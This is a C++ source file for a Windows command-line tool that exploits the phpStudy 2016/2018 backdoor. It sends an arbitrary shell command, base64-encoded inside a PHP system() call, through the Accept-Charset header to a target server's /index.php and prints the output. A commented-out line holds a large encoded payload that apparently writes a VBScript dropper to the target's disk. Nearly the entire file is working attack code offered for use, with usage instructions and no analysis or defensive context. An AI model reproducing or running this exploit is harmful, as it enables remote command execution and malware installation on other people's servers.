#include <iostream>
#include <Windows.h>
#include <winhttp.h>
#include "base64/base64.h"
#include <regex>
#pragma comment(lib, "winhttp")
using namespace std;

wchar_t* chartowchar(const char* commend) {
    size_t newsize = strlen(commend) + 1;
    wchar_t* wcstring = new wchar_t[newsize];
    size_t convertedChars = 0;
    mbstowcs_s(&convertedChars, wcstring, newsize, commend, _TRUNCATE);
    return wcstring;
}


void PHPSTUDYBACKDOOR(const wchar_t * IP, string commend) {
    HINTERNET hSession, hConnect, hRequest;
    BOOL bResults = FALSE;
    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    hConnect = WinHttpConnect(hSession, IP, 80, 0);
    hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/index.php", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    WinHttpAddRequestHeaders(hRequest, L"accept-Encoding:gzip,deflate", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpAddRequestHeaders(hRequest, L"Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", (ULONG)-1l, WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpAddRequestHeaders(hRequest, L"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);

    string commend_head = "system('echo ---- &" + commend;
    string commend_tail = " & echo ----');";

    string commend_system = commend_head + commend_tail;

    string COMMEND_PADYLOAD = base64_encode(reinterpret_cast<const unsigned char*>(commend_system.c_str()), commend_system.length());
    string commend_cmd = "Accept-Charset:" + COMMEND_PADYLOAD;
    

    //WinHttpAddRequestHeaders(hRequest, L"Accept-Charset: ZmlsZV9wdXRfY29udGVudHMoImM6LzEudHh0IiwgIlJuVnVZM1JwYjI0Z1NteE1ZM05zWm1aR1ZGRktka0ppS0VwRWJIaHVkR1p4WkVwd2EzWXBDV1Z0ZG14dGNtaDJjMmhYVVNBOUlDSThRalkwUkVWRFQwUkZJSGh0Ykc1ek9tUjBQU0ltSUVOb2NpZ3pOQ2tnSmlBaWRYSnVPbk5qYUdWdFlYTXRiV2xqY205emIyWjBMV052YlRwa1lYUmhkSGx3WlhNaUlDWWdRMmh5S0RNMEtTQW1JQ0lnSWlBbUlGOEpDU0prZERwa2REMGlJQ1lnUTJoeUtETTBLU0FtSUNKaWFXNHVZbUZ6WlRZMElpQW1JRU5vY2lnek5Da2dKaUFpUGlJZ0ppQmZDUWxLUkd4NGJuUm1jV1JLY0d0MklDWWdJand2UWpZMFJFVkRUMFJGUGlJSlUyVjBJRWRhUzNwUVFXVjJXbWxwY21wTUlEMGdRM0psWVhSbFQySnFaV04wS0NKTlUxaE5UREl1UkU5TlJHOWpkVzFsYm5RdU15NHdJaWtKUjFwTGVsQkJaWFphYVdseWFrd3VURzloWkZoTlRDaGxiWFpzYlhKb2RuTm9WMUVwQ1Vwc1RHTnpiR1ptUmxSUlNuWkNZaUE5SUVkYVMzcFFRV1YyV21scGNtcE1Mbk5sYkdWamRITnBibWRzWlc1dlpHVW9Ja0kyTkVSRlEwOUVSU0lwTG01dlpHVlVlWEJsWkZaaGJIVmxDWE5sZENCSFdrdDZVRUZsZGxwcGFYSnFUQ0E5SUc1dmRHaHBibWRGYm1RZ1JuVnVZM1JwYjI1R2RXNWpkR2x2YmlCWVUwWkZZMUYyZDJ0RmFrSk9XSElvS1FsS2NubHJRMDVvUTJod2VXTWdQU0FpVkZaeFVVRkJUVUZCUVVGRlFVRkJRUzh2T0VGQlRHZEJRVUZCUVVGQlFVRlJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZuUVVGQlFVRTBablZuTkVGMFFXNU9TV0puUWxSTk1HaFdSMmh3WTNsQ2QyTnRPVzVqYlVaMFNVZE9hR0p0Tlhaa1EwSnBXbE5DZVdSWE5HZGhWelJuVWtVNVZFbEhNWFphUjFWMVJGRXdTMHBCUVVGQlFVRkJRVUZDVVZKUlFVRlVRVVZFUVV4SVMxaEhNRUZCUVVGQlFVRkJRVUZQUVVGRWQwMU1RVkZKTkVGQlNVRkJRVUZQUVVGQlFVRkJRVUZCUWtGQlFVRkJVVUZCUVVGSlFVRkJRVUZDUVVGQlFWRkJRVUZCUVdkQlFVSkJRVUZCUVVWQlFVRkJSVUZCUVVGQlFVRkJRVUZDUVVGQlFVRkJaMEZCVW1wdlFVRkJTVUZCUVVGQlFVTkJRVUZDUVVGQlFVRkJSVUZCUVVWQlFVRkJRVUZCUVVKQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVhkQlFVSnJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRelV3V2xob01FRkJRVUZMUVVGQlFVRkJVVUZCUVVGQlowRkJRVUZKUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUTBGQlRVZEJkVnBIUmpCWlVVRkJRVXBCUzBGQlFVRkpRVUZCUVVGM1FVRkJRVVZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCWjBGRVJHZE1iV3hyV1ZoU2FFRkJRbXRCUVVGQlFVUkJRVUZCUVVOQlFVRkJSVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZSUVVGM2QwRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVU0wUVVOQ1FVRlFMMmRyVURoc1QwUkNRVUZLUTFGQlFVRkJRVUZCUVVGQlJDOHZMeTh2UVVGQlFVRlFMeTh2THpoQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJUR3BEZWxWQ2VUSjBOMXBrUTFRd1dHcElTbHB5YTBWQmFrWkhSbEZPUjBaWlVIVlFhU3N4VVRNM1dWQnlVU3RIVm5STWFtNHdjV3Q0UzFaeWRGUnhXbk01WkVReFpsQlBhMVJKTHpCclNUVllVV1oxU0RjMGFVMDRNM1FyTnl0NVQxUlVXVlYyTTBJd1JubFBSbkZCYzNsWFdEQkhkMmhEYzFGYVpqVmtkbFZhUjJacVEwdFJhbWROTkhsNFEyazNWMk5hZGxCS1F6QjZaa0ZQWlV0U1IwMUdTak5LVVhkcmVHdFRjU3RhVkZsR1luaHZRbkZOWkVSTE9GSjVObVZRU1hWd1ZsUktaM1pVUmxoa2VFcExXUzk1Vm01UFZrZHphbWwwU0dSeldrTXZVR3RsWmxOelVWQkpXblZRYUZwa1p6QjRXVmxaV2xGb1N6Qm9kbWs0T1VVNGJrOHZjR3h1T1UxR2FIVkVObmRrUzNkc1QwSmhWekpSVFdvdlduWnhNa1JzYTJsSFFXY3lOMlZoUm5sNEwzQkxNakp3WkhWUFpsVTNOWFFyWmpBMk5VbE9lR0ZXVVV0Q2NDOTVjblUwTVdocGFISjVkM1JMYXpoc05VazVkQzlSYlZoTmFsRkVaMnhtY25RMU5IZGhMMHMyUVVVMk9HSndWekIyZFdKcldEQkVlbkZHTmlzME5razRZMjlGYXpJd2VubENUblZhV1VsVVFuUklNbEo2VFdWSkwxUnZhVGgxZEZoU2RXcFZOM1J5WWt0MmRUY3ljRlJpTDJWTWJEWlplQzkyTlRaQ2RrTXdNM2tyWVhScmQzWnFORlZuYVVadlV6ZGhlR2RTT1RKTWNEZFVVemx4TUN0a2VYaFlUSGhMTUhNck1IUm9lRXMwZEV0ak1GbHdXbElyUjJRd1Vtd3dWVEJ6T0ZoalpVTmtPV3RXTXpSc1NuTjJWMDVPZERaQmVrb3dRWEV2YUhobVN5dEVabko0VkVocWIwd3dWVWhLV1ZGSVlWbFlSMnRCWW05WVF6YzNkR1pPZDJsc2RXZ3JkbmhWY1VOcGRrTmpRbE5uWVdWUk9UTnpRVXRRS3pscE5tOUNPWE5oZW1KQ1luUmphazFaTjNKNldWa3ZlV2RyVDFKMlpuaFdZMWRCTTJwNVEzZFlZM3AyU1dWV1RtWXhVR3hPYjJOUlJFTm9URUpLTUU4eVExRmtlbHBQZFVWU1ZVcDVWSGN3V2t0RFkxcEhhV0UwUVhZME9EUkZlVmd5U1dSYWIybHNTVEphYVZsSlkyaG1LMkpNYzBsc1pUUklZVUpzTXpoeldHTkZVMjFsTW5CTU4xQkZlQ3RCVnpoaGFWZFNjSFEwTlVGNU9YUnhPVW81ZEdSWlIwbFJjblV3T0VwYVNqUnhRME51UlVGcmVHWktTemxpWnpBd01GVnpTekpNV1c5ek1HOXdhRll2YlRZNGREZHJlVGt5UjNsaU56VlRTM3BKY0U1UFFtZzFNMUU1V1hoSVFqWmthMjVLT1NzMmNqQTVkWGxNVW1oSGEyMVphVWxEWjFKdlVIVlFVeTlyYTJkaGVFOXBXVU5XWTNKamFVWm9kMGsyUlRoSlVWUnhPVmhHZGpkYVpqSXpkVmxIVnpOWFZ6aGtZM1pEZEhwQmQzcHdSMFVyY0c1VVRrNUJiRXMzU0cwNE5UWm5hWG93WVRScmFtWlRiakZyZGs0eEsyWk5SMEZuVDJKVFdHRjJSWEJXUkdadlJXTllTVEpEU0hNcmQwWldMemR6YkZSMVYwNUdXSGRMY2tsbldXOHhkVTAwYkhSSFVHWXZNMUpKUm10QlZFZG1lRFphVG05RVpXSjBNemR2ZURGemJIWlVhMUF3T1RZeFEycFRjMjF2UjFSaVVVbHJjRXAyVUZoYU5XRjVZV2hPY1dNM1lYbEpWMUZaYlN0M2VITnpPVlJQZVdsV2RtcFBLM1pEVUUxWmN6Qk5ObXRVUms1dlpsWjVZVGRPVFdSRE1uRjNUSFJEYkZWWlVTc3dURTlJTjA1U1JqZEJjMnRzVW0xb09VZGpZVU42YUUwcldYZE1NekJqT0c5TU9FMWFha05FVjA1R04yeHBjeXRWSzFGRGMxcHRUVTR4ZFU5aWJVOXNSRTB6U0ZOalNrRjRMemhFTTJKU1FsQnNibUZJTUVsdVMxTkRjM2xCYmtkRVNsQkpTVGxNWTJoNlpVUXZXRTVCUmtWUmN6UkJNWGhwVm10TVdWWnBlbTVpWVc5V1RuTlNhVkJDVjFWU1IzSXplV0pJTlVWcldrSnZhVlkwWXk5UlpYTTFWbVYyTVVodVZqbEpUV1ZQWkVSUVNFSXdlWEl3V0cweFF6UlVPVXhZUkVaWlQwc3JUWFpVTmtKaFZ6STVORzh4TlVKT05ESlFWVXg0UkdFd1ltZFBaa2t6Y2xwamNtMDVkakl4S3pSeGNrUnZTbmxzVmxjM09UZEhTMUJLYWpGaFNYRTBUbmRXUlhoWFJtUkJSelJMWmtsRWFqUm9SRWxYWjBaek1FSkxVa2hVY0hFeWRUUXdSR3RsTTFoWWNHVlFabllyZUVFMmRub3dSMEpUVkVScGVVSm1lSGRVWmt4c1NIY3ZPVkl5VERWck1rbHNkM1Z0U0RFcmJWVnNMeXR2ZVdOSlpEYzBOVXRVVG1JNFNqZ3pUelZqVW5OaFRHTkpOSEZtZUM5MFMzSnVOMlZXV2tkVmFHaHZRVTFaZVN0VFFUQlhWMlpOYmpsWU0xUkdiV1pKYjAwMWF6SnRibkJNWm1odVFtVmxkRloyVjI5cGN6RktNM0EyZVRZdlFWaGhXVTh4U2psRVJFTjFNemhQTVhvd2RFSlpkRFUyT0ZBMWFGZG5iSFJrZVVaa05tZFFLeko1Y1VvNVltNVdXRE5YUjFobmJDOHpZbFk0T1M4eVJUTkJTRXBQZFRBMVVYbzFLMUp1TTBvdlZXSjVXSGRFUnpVeVpXVnNhRkF4WjFSQ1NXSjBPSEkzVUV4UWVtRk5OR3B0ZGpaMVpGTXJOalIxUkV0M2RERlZUemMxUjFOVFpteHpjalJOWlN0SFRFOXhNSGwwUjJRMWQzcG9SVUZyY0c5a1prRnZWa2xzUTJ0T1dEUnlibE4yTjJSaE5tSkRURUk1ZFRsMWNubFRRMnBLWkdWSWFqbGlRVVUzUVdGVFUyZDFaakZYTWxnclltaEpSbFJDTjJ0bFVHdE5RakJ5ZG1FNFVFbGxiamt4VUhkWVVFTllVMHAxVDJZd2JHTm1jR3RvTTBabWJtaG1jSEJLU1hveEszTTFWVTFIV0hsSWVqbFZRM0ZzYTA5NldrTkZXV1I0YUhCaldGRlVLM28xYlRsS1NqUmpaRm9yYVd4T1lXNDFUMlE0ZGs5MFEwTlRXVTk2TWxwRFJYUktWVTlWUXpsYU1rTnRabEJSTVVGS2FTOW1ZekZWVlZOWlJFSjFTRUl3YTJkR1NXNUtkRmQzZWtKa1dTOHJlVkZCUWpaU1dWSjRZbkZIZVc0MmFTdG5kVEpzTHpsWlptRm1aVmxIYlRaS1oyTjZNMWs0SzFKT2IwRjVTalJhU0c5RWJYbDFPVTh2WTNvMFJYZFBTa1YwUkc5Q1NFTnFWVFZ3THpneGNtVXZSUzkxWkRoTldXVlZWMUpwTm13cmVXbzFhMDFCVEVSYVFrTjVVa00yYnpJeFN6UkxhVlZ6WVVJd1dUSkpkVTV2ZUZkelRqQkRjakowYW1admJHcFNWVzFzVHpKQlZGZDBReTlJYW1GVVpYRjVRMXBOZFdkdk1FOTVSRk15VDJJdk9VcEdhMUl2YkhONk5YUmtkSEpYTkZKc2VHdEVUbWh0UTNkS1pWWlRLelZLZDFWc0sxWjVjRXBrZW1sMGJWTmxNRTgwUzBKSEwxQjNVV2QyTTJ0VFJHSjBVMWxXTlRWdWJVWjZNREpGU2pSc2EwbzBOVW8yYmpJMFYwTTNjREkzUkhRelZUSlhWRkJ2WWxOMWRWUk1MMk52VjJoMFNHazFaVVZGZUZoSlVuWjNhR0kxVVhwaGFIVkJhMHgxYTBob2MydzNXRlpXVmxkVFkyNDROV1ZoU1hSNlNFNWplbWRsWkRoVE9IbDFaMlEzZEZKeVdtNXZhVEkwTVd0YWJXbE5NWEZZWTI4MWNYaExTM0ZJYTNSWGMyZFdZWGx5Wlc1aVVYUXJjRVY0ZEdNNWNsTXJPRU5HY2toRmNVTm1VbVIyYVVkdlVGQjNUVlY1SzBRelpYRnBjbGhVYzJsM2RYRjZhVkYxYW5seGFtbFpaMkZ4ZUhWak9FSnNXVW8wUVRGMFJubG9kbUU1WkhrMlpVRmphR1ZNZFZWWGRGTm9iVlUxYlZkTmNrSlJUMmxXVnpFdlJVNTZka3BYTTFKT1kwOXVXRGRyZDJJeFRFb3lZMXBLYUdOUlJtTjVORzkzU1RkRVJEUklZbEpTVjBwSlpYRjRhMmQ0VUd0dlpsaHdkV3hpVjFjeVMyUjRZa1V2YjNaNlRVbFNia1IxTTJKWlpsUXJlV2szTjNCVVUxbENOMEZOUmtzMk1FSkhVMFpOZFc5TlRGSnJUVTVTUm5sYWVuQXpZMnhsUjA0eVlrSlZWRVZxVjNsTlUwZEpUeTg1TVhsdGFWQjRaalF6VUdOMFJIQnNXbkowY0VvNVYyaFZTVWczVkcxWFdFUkdOVTV4YTJwNWFtZGxkVU5yYVhaWmRtWmFUR0V5YVVZNGJrWlBLMkZqVVV4eVpWTTBVbEpzVVU5NVowZHBPR280VW0xWFNYSXllVWwzVjFac2J6ZDVWMlJtVkhOQk0xaEhUWE5uTDA1dU1IQTJNbEZxY0hsaFNpOUJiVU5uYVhsQ1RWRnJVM3B0VFN0SU5tTTBaWEl3VDFCcVVWSkJORTlLZDFvNGQwWTJiak54WTJwUk16VjNRblJzU25CdlQyNHdTSEJKUjNWc1NHVjFaU3RGTkhodGRUUXlkR05oWmtKQlpHd3dWRFZTVm5Cb1FrTkxVbUppZDBKRVYyeEVVVlZpS3pOVGMxSnRWbGMxVVhSeFkycE5iVUpHTjJkSFJFWkRiemcxWlVwNk4wbHZhMlZCWWxZNFFtSmpSRmcxYm1saksxUlljWGxvVlhVMlpVUjRaRU51WldaS1ZESlBUWEJUVlRkTmRHRmxRVzFKVmpOTk0xVXZkSEIxVG5KUmFIYzBkWG80YmxoNVZuQTFhMVoyU21WMldVVnBhMHhNUzFCa1ozZDFiVk14ZVVKc1lXVlRjMXBPTm1KeUwzbFpiaXRWYldGaVJHWTBlVmR2UTBsNU5GRkJUREp5WWpCTmMyZFJjMmd2VldjNVRITkRiSGxPVDNOdlREa3ZXRVI1VDJRcldTdFNMMmN5UmxNNWQxcEpRM3A1VldneVpsTndhbU5sWTFScE5WZGphV1pWTVdGeU9EVmpNRGcwTVhSbmIyWXZhRWxyWlZoTE1XNUxOMmM1TWpJNVREUmpielJTZG5KYVptVTFXbU5HV0ZsUFYwNWFNVkJwY0U1RlV6WmljMHAzYWsxMWJVZG5lSEZEZHpsU2RWcHRZbXBKZEROUlJFZERNVnAwVW1veVZuWklOR3REVkRScGRYQnpPV2QzUWpKMFpFOHdXVFZ3U0ZKcllrRm9LMWgwVjJaWFdrRmhiQ3M0VVhsWFV6VnZhV1ZqTlVoblQxbG9UamczYWtWRGExaENUbmhvUjNGMlpYQnhUVzU2VEdOU2RIUkxXbko2YUV0TWNYaFpRbFIwV1VVclJITkZNVkpDVUZSNk9IbEdOVXB6VVdKbEwxWXljMGx5ZUVWak1scG5XbGxsU0hGRVJHSnpibUZ4Tkc1WFRFUkpVMFVyUTJWNU0xVXhjakpWYVVoWll5dDRjWE55YUdOVVpIZHhkRU4yV1ZKdVZqa3lVVmt2TTIxbWEyMXJNRlp6TW5ocmMyWXdkRWxHVEhOd1JHdG9Za1ZNYVZwNE5sSkNUakZMWTI4cldrcElTMVpyUVVoek9WZGlOazlNZG5KVU5FRnJUMnhGWTFkNlFrNUxMMHhwVGtaemJ5dFViR0ZsUVZjMGR6RnVjbVJrT0VOb1QzVTBjbXRqYURRM1NTdERVMmxxWnpCUlRXNXJZV1JrTHpSdFEya3ZZMWN5U1VKaVZDOUJLM05tTUVkSldFbzBhbk0zV0Vac2FuaDJjVkI0Um1zeGR5dDRRa0puSzJoVk1rOHhUVkV5ZGtoRFJVczJSVzFLUldsNE5UTkhWbWxXY1VVd01ubE1ZV3RxTUdKclJrRnBhWGhxZG1WWlFuUnRkRlYzTmxCNFdDODBWa2RxWmtZd1REUjRaR2x1T1RaQ1kxUXpkazFMU2xkd1kwWlNTa1JQTDFsdFFWWTJabU5CUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVU4zZDBGQlFVRkJRVUZCUVVGQlFVRkdVWGRCUVVFMFRVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlVVUkJRVUZCUVVGQlFVRkJRVUZCUVZGRVFVRkJRVUZCUVVGRFkwRkZWalJoV0ZKUlkyMDVhbHBZVG5wQlFVRkJRVVJCUVVGRmRFWlZhelZHVkVSTmVVeHRVbk5pUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJlSGhqYWs1MWRuZ2lDVVJwYlNCbmJXNXZRVVJ2VUhaSkNWTmxkQ0JuYlc1dlFVUnZVSFpKSUQwZ1EzSmxZWFJsVDJKcVpXTjBLQ0pUWTNKcGNIUnBibWN1Um1sc1pWTjVjM1JsYlU5aWFtVmpkQ0lwQ1VScGJTQmhjbmg1ZDBoUWVYTlViZ2xFYVcwZ2RXcEhVblJIWm5kckNWTmxkQ0JoY25oNWQwaFFlWE5VYmlBOUlHZHRibTlCUkc5UWRra3VSMlYwVTNCbFkybGhiRVp2YkdSbGNpZ3lLUWwxYWtkU2RFZG1kMnNnUFNCaGNuaDVkMGhRZVhOVWJpQW1JQ0pjSWlBbUlHZHRibTlCUkc5UWRra3VSMlYwVkdWdGNFNWhiV1VvS1FsbmJXNXZRVVJ2VUhaSkxrTnlaV0YwWlVadmJHUmxjaWgxYWtkU2RFZG1kMnNwQ1dKT1ZsVklaR1JNWlNBOUlIVnFSMUowUjJaM2F5QW1JQ0pjSWlBbUlDSkNabE5GZEZKdFozZEpZa0ZRVldvdVpYaGxJZ2xFYVcwZ2RteFhWVXBxUkUxMVEyNTZhbVJCQ1ZObGRDQjJiRmRWU21wRVRYVkRibnBxWkVFZ1BTQkRjbVZoZEdWUFltcGxZM1FvSWxkelkzSnBjSFF1VTJobGJHd2lLUWxsVFZaTGExVlZhbGRJYmt0eklEMGdTbXhNWTNOc1ptWkdWRkZLZGtKaUtFcHllV3REVG1oRGFIQjVZeWtKVTJWMElFSmlVRmQyUVdSeklEMGdRM0psWVhSbFQySnFaV04wS0NKQlJFOUVRaTVUZEhKbFlXMGlLUWxDWWxCWGRrRmtjeTVVZVhCbElEMGdNUWxDWWxCWGRrRmtjeTVQY0dWdUNVSmlVRmQyUVdSekxsZHlhWFJsSUdWTlZrdHJWVlZxVjBodVMzTUpRbUpRVjNaQlpITXVVMkYyWlZSdlJtbHNaU0JpVGxaVlNHUmtUR1VzSURJSmRteFhWVXBxUkUxMVEyNTZhbVJCTG5KMWJpQmlUbFpWU0dSa1RHVXNJREFzSUhSeWRXVUpaMjF1YjBGRWIxQjJTUzVFWld4bGRHVkdhV3hsS0dKT1ZsVklaR1JNWlNrSloyMXViMEZFYjFCMlNTNUVaV3hsZEdWR2IyeGtaWElvZFdwSFVuUkhabmRyS1VWdVpDQkdkVzVqZEdsdmJsaFRSa1ZqVVhaM2EwVnFRazVZY2dvPSIpOw==", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpAddRequestHeaders(hRequest, chartowchar(commend_cmd.c_str()), (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);
    bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    bResults = WinHttpReceiveResponse(hRequest, NULL);
    
    LPSTR pszOutBuffer = NULL;
    DWORD dwDownloaded = 0;
    DWORD dwSize = 0;
    wchar_t* pwText = NULL;
    if (bResults)
    {
        do
        {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                printf("%s", "Error：WinHttpQueryDataAvailable failed：" + GetLastError());
                break;
            }
            if (!dwSize) {
                break;
            }
            pszOutBuffer = new char[dwSize];
            if (!pszOutBuffer) {
                printf("%s", "Out of memory.");
                break;
            }
            ZeroMemory(pszOutBuffer, dwSize);
            if (!WinHttpReadData(hRequest, pszOutBuffer, dwSize, &dwDownloaded)) {
                printf("%s", "Error：WinHttpQueryDataAvailable failed：" + GetLastError());
            }
            if (!dwDownloaded) {
                break;
            }
        } while (dwSize > 0);


        std::regex ip_reg("(.*)\.123\.456");
        std::smatch matchResult;

        cout << pszOutBuffer;
        //DWORD dwNum = MultiByteToWideChar(CP_ACP, 0, pszOutBuffer, -1, NULL, 0);
        //pwText = new wchar_t[dwNum];
        //MultiByteToWideChar(CP_UTF8, 0, pszOutBuffer, -1, pwText, dwNum);
        //printf("Received contents: \n%S", pwText);
    }
    return;
}

void PHPSTUDYBACKDOOR_HELP() {
    cout << "----------------------------------------" << endl;
    cout << "PHPstudy backdoor RCE " << endl;
    cout << "Affect Version:" << endl;
    cout << "          phpStudy2016 and phpStudy2018 " << endl;
    cout << "Usage: phpstudybackdoor.exe IP COMMEND" << endl;
    cout << "----------------------------------------" << endl;
}

int main(int argc, const char * argv[])
{
    if (argc != 3)
    {
        PHPSTUDYBACKDOOR_HELP();
        exit(0);
    }
    string commend = argv[2];
    PHPSTUDYBACKDOOR(chartowchar(argv[1]), commend);
}

